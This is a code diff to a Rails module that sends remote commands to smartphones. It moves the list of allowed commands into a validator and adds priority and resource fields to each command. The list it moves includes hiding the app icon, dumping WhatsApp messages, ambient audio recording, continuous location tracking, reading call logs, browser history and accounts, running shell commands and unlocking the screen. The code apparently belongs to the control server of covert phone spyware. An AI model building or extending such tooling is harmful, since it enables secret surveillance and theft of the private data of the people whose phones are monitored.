@@ -15,22 +15,8 @@
 module CommandSender
   extend ActiveSupport::Concern
   
-  # SECURITY: Whitelist of allowed commands
-  ALLOWED_COMMANDS = %w[
-    send_sms get_sms get_device_info start_camera stop_camera
-    get_wifi_info get_localtime uninstall_app install_apk
-    launch_app get_installed_apps get_contacts take_picture
-    take_photo take_screenshot screen_record get_location
-    get_call_logs get_browser_history toggle_wifi set_audio_mode
-    get_notifications get_accounts get_app_usage
-    shell_exec check_root hide_icon show_icon unlock_screen
-    start_continuous_location dump_whatsapp_messages
-    start_audio stop_audio start_screen_record stop_screen_record
-    ambient_record browse_files start_webrtc_stream
-    list_files download_file upload_file delete_file preview_file
-    rename_file move_file search_files upload_file_chunk
-    ping social_media_chats change_audio_mode
-  ].freeze
+  # Single source of truth: CommandValidator.ALLOWED_COMMANDS
+  ALLOWED_COMMANDS = CommandValidator::ALLOWED_COMMANDS
   
   def send_command_async(smartphone, command, params = {})
     request_id = SecureRandom.uuid
@@ -45,6 +31,9 @@ module CommandSender
     
     # SECURITY: Sanitize parameters based on command type
     sanitized_params = sanitize_command_params(command, params)
+
+    priority = CommandValidator.priority_for(command)
+    resource = CommandValidator.resource_for(command)
     
     # Create pending command record
     pending_command = PendingCommand.create!(
@@ -62,10 +51,12 @@ module CommandSender
           {
             request_id: request_id,
             action: command.to_s,
-            params: sanitized_params
+            params: sanitized_params,
+            priority: priority,
+            resource: resource
           }
         )
-        Rails.logger.info("Sent command #{command} to device #{device_id}, request_id: #{request_id}")
+        Rails.logger.info("Sent command #{command} (#{priority}/#{resource}) to device #{device_id}, request_id: #{request_id}")
     
     pending_command
   end
